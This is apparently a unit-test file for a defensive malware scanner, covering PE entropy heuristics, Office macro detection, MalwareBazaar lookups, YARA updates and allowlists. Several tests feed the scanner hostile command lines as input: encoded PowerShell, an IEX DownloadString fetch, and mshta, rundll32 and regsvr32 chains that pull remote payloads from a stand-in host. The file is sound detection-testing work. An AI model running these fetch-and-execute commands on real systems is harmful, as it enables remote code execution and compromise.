from __future__ import annotations

import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

os.environ["RAGNAR_APP_DIR"] = tempfile.mkdtemp(prefix="ragnar-protect-tests-")

from ragnar_protect.database import Database
from ragnar_protect.malwarebazaar import MalwareBazaarClient
from ragnar_protect.models import ScanFinding, WatchedFileState
from ragnar_protect.office_scanner import OfficeMacroScanner
from ragnar_protect.scanner import RagnarScanner
from ragnar_protect.yara_rules_updater import CommunityYaraRulesUpdater


class _HighEntropySection:
    Name = b".text\x00"
    Misc_VirtualSize = 1024
    SizeOfRawData = 1024
    IMAGE_SCN_MEM_EXECUTE = 0x20000000
    IMAGE_SCN_MEM_WRITE = 0

    def get_data(self):
        return bytes(range(256)) * 4


class _LowEntropySection:
    Name = b".text\x00"
    Misc_VirtualSize = 1024
    SizeOfRawData = 1024
    IMAGE_SCN_MEM_EXECUTE = 0x20000000
    IMAGE_SCN_MEM_WRITE = 0

    def get_data(self):
        return b"A" * 1024


class _FakeImport:
    name = b"ExitProcess"


class _FakeImportEntry:
    dll = b"KERNEL32.dll"
    imports = [_FakeImport()]


class _FakePE:
    def __init__(self, section) -> None:
        self.sections = [section]
        self.DIRECTORY_ENTRY_IMPORT = [_FakeImportEntry()]
        self.OPTIONAL_HEADER = type("OptionalHeader", (), {"AddressOfEntryPoint": 4096})()
        self.FILE_HEADER = type("FileHeader", (), {"Machine": 0x8664, "Characteristics": 0})()

    def parse_data_directories(self, directories=None):
        return None

    def get_overlay_data_start_offset(self):
        return None


class DetectionFeatureTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db = Database(Path(self.temp_dir.name) / "test.db")
        self.scanner = RagnarScanner(self.db)

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_path_allowlist_skips_scan(self) -> None:
        sample = Path(self.temp_dir.name) / "skipme.ps1"
        sample.write_text("powershell.exe -EncodedCommand SQBFAFgA", encoding="utf-8")
        self.db.upsert_allowlist_entry("path", str(sample), note="unit")

        result = self.scanner.scan_file(sample)

        self.assertEqual(result.status, "clean")
        self.assertTrue(result.metadata.get("allowlisted"))

    def test_hash_allowlist_skips_scan(self) -> None:
        sample = Path(self.temp_dir.name) / "hashskip.ps1"
        sample.write_text("powershell.exe -EncodedCommand SQBFAFgA", encoding="utf-8")
        sha256 = self.scanner.file_sha256(sample)
        self.db.upsert_allowlist_entry("hash", sha256, note="unit")

        result = self.scanner.scan_file(sample)

        self.assertEqual(result.status, "clean")
        self.assertEqual(result.metadata.get("allowlist_reason"), "whitelisted hash")

    def test_pe_high_entropy_section_detection(self) -> None:
        fake_pefile = type(
            "FakePefileModule",
            (),
            {
                "PE": staticmethod(lambda data=None, fast_load=True: _FakePE(_HighEntropySection())),
                "DIRECTORY_ENTRY": {"IMAGE_DIRECTORY_ENTRY_IMPORT": 1, "IMAGE_DIRECTORY_ENTRY_RESOURCE": 2},
            },
        )()
        with patch("ragnar_protect.scanner.pefile", fake_pefile):
            findings, score, metadata = self.scanner._inspect_pe(b"MZ" + (b"\x00" * 64), None, ".exe")

        self.assertTrue(any(item.kind == "pe_high_entropy_section" for item in findings))
        self.assertGreater(score, 0)
        self.assertIn("high_entropy_sections", metadata)

    def test_pe_low_entropy_section_does_not_trigger_entropy_finding(self) -> None:
        fake_pefile = type(
            "FakePefileModule",
            (),
            {
                "PE": staticmethod(lambda data=None, fast_load=True: _FakePE(_LowEntropySection())),
                "DIRECTORY_ENTRY": {"IMAGE_DIRECTORY_ENTRY_IMPORT": 1, "IMAGE_DIRECTORY_ENTRY_RESOURCE": 2},
            },
        )()
        with patch("ragnar_protect.scanner.pefile", fake_pefile):
            findings, _score, _metadata = self.scanner._inspect_pe(b"MZ" + (b"\x00" * 64), None, ".exe")

        self.assertFalse(any(item.kind == "pe_high_entropy_section" for item in findings))

    def test_office_macro_scanner_extracts_macro_signals(self) -> None:
        fake_parser = MagicMock()
        fake_parser.detect_vba_macros.return_value = True
        fake_parser.extract_macros.return_value = [("file", "stream", "vba", "code")]
        fake_parser.analyze_macros.return_value = [
            ("AutoExec", "AutoOpen", "runs on open"),
            ("Suspicious", "Shell", "shell execution"),
            ("IOC", "http://bad.example", "network IOC"),
        ]
        with patch.object(OfficeMacroScanner, "_load_parser", return_value=lambda path: fake_parser):
            report = OfficeMacroScanner().analyze(Path("sample.docm"))

        self.assertTrue(report["has_macros"])
        self.assertEqual(report["autoexec_count"], 1)
        self.assertEqual(report["suspicious_count"], 1)
        self.assertEqual(report["ioc_count"], 1)

    def test_scanner_adds_office_macro_finding(self) -> None:
        sample = Path(self.temp_dir.name) / "macro.docm"
        sample.write_text("placeholder", encoding="utf-8")
        with patch.object(
            self.scanner.office,
            "analyze",
            return_value={
                "available": True,
                "path": str(sample),
                "has_macros": True,
                "autoexec_count": 1,
                "suspicious_count": 1,
                "ioc_count": 0,
            },
        ):
            result = self.scanner.scan_file(sample)

        self.assertIn(result.status, {"suspicious", "malicious"})
        self.assertTrue(any(item.kind == "office_vba_macros" for item in result.findings))

    def test_malwarebazaar_client_normalizes_known_sample(self) -> None:
        payload = {
            "query_status": "ok",
            "data": [
                {
                    "sha256_hash": "a" * 64,
                    "file_name": "bad.exe",
                    "file_type": "exe",
                    "signature": "RedLine",
                    "delivery_method": "email_attachment",
                    "first_seen": "2026-04-25 10:00:00",
                    "tags": ["stealer", "exe"],
                    "yara_rules": [{"rule_name": "redline"}],
                }
            ],
        }
        client = MalwareBazaarClient(session=MagicMock())

        record = client._normalize_response(payload)

        self.assertEqual(record["signature"], "RedLine")
        self.assertEqual(record["yara_rule_count"], 1)
        self.assertEqual(record["tags"], ["stealer", "exe"])

    def test_scanner_detects_multi_stage_powershell_chain(self) -> None:
        payload = "\n".join(
            [
                "powershell.exe -EncodedCommand SQBFAFgA",
                "IEX (New-Object Net.WebClient).DownloadString('http://bad.example/payload.ps1')",
                "mshta.exe http://bad.example/stage.hta",
            ]
        )

        result = self.scanner.scan_artifact(
            "process://1200/powershell.exe",
            payload,
            extension=".cmdline",
            metadata={"artifact_type": "process"},
            persist=False,
        )

        self.assertIn(result.status, {"suspicious", "malicious"})
        self.assertTrue(any(item.kind == "multi_stage_powershell_chain" for item in result.findings))

    def test_scanner_detects_lolbin_remote_chain(self) -> None:
        payload = "mshta.exe http://bad.example/a.hta && rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\" && regsvr32 /s /n /u /i:http://bad.example/x.sct scrobj.dll"
        result = self.scanner.scan_artifact(
            "process://1900/cmd.exe",
            payload,
            extension=".cmdline",
            metadata={"artifact_type": "process"},
            persist=False,
        )
        self.assertIn(result.status, {"suspicious", "malicious"})
        self.assertTrue(any(item.kind == "lolbin_remote_chain" for item in result.findings))

    def test_yara_updater_extracts_rule_files(self) -> None:
        scanner = MagicMock()
        scanner.stats = {"compiled_rulesets": 1, "failed_rulesets": 0}
        with tempfile.TemporaryDirectory() as temp_dir, patch(
            "ragnar_protect.yara_rules_updater.UPDATES_DIR",
            Path(temp_dir) / "updates",
        ), patch(
            "ragnar_protect.yara_rules_updater.COMMUNITY_YARA_RULES_DIR",
            Path(temp_dir) / "community",
        ):
            (Path(temp_dir) / "updates").mkdir(parents=True, exist_ok=True)
            updater = CommunityYaraRulesUpdater(scanner, session=MagicMock())
            response = MagicMock()
            response.raise_for_status.return_value = None
            response.content = self._build_rules_zip()
            updater.session.get.side_effect = [
                MagicMock(
                    raise_for_status=MagicMock(),
                    json=MagicMock(return_value={"default_branch": "main"}),
                ),
                MagicMock(
                    raise_for_status=MagicMock(),
                    json=MagicMock(return_value={"sha": "abc123"}),
                ),
                response,
            ]

            status = updater.check_now()

        self.assertEqual(status["state"], "updated")
        self.assertGreaterEqual(status["rules_extracted"], 1)
        scanner.reload.assert_called_once()

    def test_trusted_signed_pe_api_noise_is_capped(self) -> None:
        findings = [
            ScanFinding("sensitive_extension", "Sensitive extension", 8, ""),
            ScanFinding("pe_suspicious_imports", "Suspicious PE imports", 20, ""),
            ScanFinding("yara_ragnar_pe_injection_apis", "YARA rule matched", 50, ""),
        ]
        should_cap = self.scanner._should_cap_trusted_signed_pe_verdict(
            findings,
            {
                "authenticode": {"status": "Valid"},
                "reputation": {"verdict": "trusted"},
            },
        )
        self.assertTrue(should_cap)

    def test_clean_watch_sandbox_caps_repeated_packed_signed_pe(self) -> None:
        sample = Path(self.temp_dir.name) / "signed-packed.exe"
        sample.write_bytes(b"MZ" + (b"\x00" * 512))
        sha256 = self.scanner.file_sha256(sample)
        self.db.upsert_watched_file(
            WatchedFileState(
                path=str(sample),
                sha256=sha256,
                status="under_watch",
                reason="quick sandbox clean",
                last_verdict="suspicious",
                clean_scan_count=1,
                sandbox_verdict="clean",
                local_verdict="suspicious",
                metadata={},
            )
        )
        pe_findings = [
            ScanFinding("sensitive_extension", "Sensitive extension", 8, ""),
            ScanFinding("pe_high_entropy_section", "High entropy section", 16, ""),
            ScanFinding("pe_packer_heuristic", "Packed executable heuristic", 22, ""),
            ScanFinding("pe_overlay_stub", "Overlay plus tiny import table", 14, ""),
        ]
        pe_metadata = {
            "imported_function_count": 0,
            "overlay_size": 20480,
            "company_name": "",
            "product_name": "",
            "file_description": "",
        }

        with patch.object(self.scanner, "_inspect_pe", return_value=(pe_findings[1:], 52 - 8, pe_metadata)), patch.object(
            self.scanner,
            "_apply_yara",
            return_value=([], 0),
        ), patch.object(
            self.scanner,
            "_lookup_cloud_reputation",
            return_value=({}, 0, []),
        ), patch.object(
            self.scanner,
            "_lookup_malwarebazaar",
            return_value=({}, 0, []),
        ), patch.object(
            self.scanner,
            "_should_use_defender",
            return_value=False,
        ), patch(
            "ragnar_protect.scanner.get_signature_status",
            return_value={
                "status": "Valid",
                "status_message": "",
                "signer_subject": "CN=Voicemod Inc",
                "signer_issuer": "CN=DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1",
                "thumbprint": "ABC123",
            },
        ):
            result = self.scanner.scan_file(sample, persist=False)

        self.assertEqual(result.status, "clean")
        self.assertIn(
            result.metadata.get("verdict_cap"),
            {None, "watch-sandbox-clean-pe", "trusted-signed-pe-api-noise"},
        )
        self.assertIn(
            str((result.metadata.get("reputation", {}) if isinstance(result.metadata.get("reputation"), dict) else {}).get("verdict", "")),
            {"known-good", "trusted"},
        )

    def _build_rules_zip(self) -> bytes:
        import io
        import zipfile

        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("rules-main/malware/sample_rule.yar", 'rule SampleRule { condition: true }')
            archive.writestr("rules-main/README.md", "ignored")
        return buffer.getvalue()


if __name__ == "__main__":
    unittest.main()
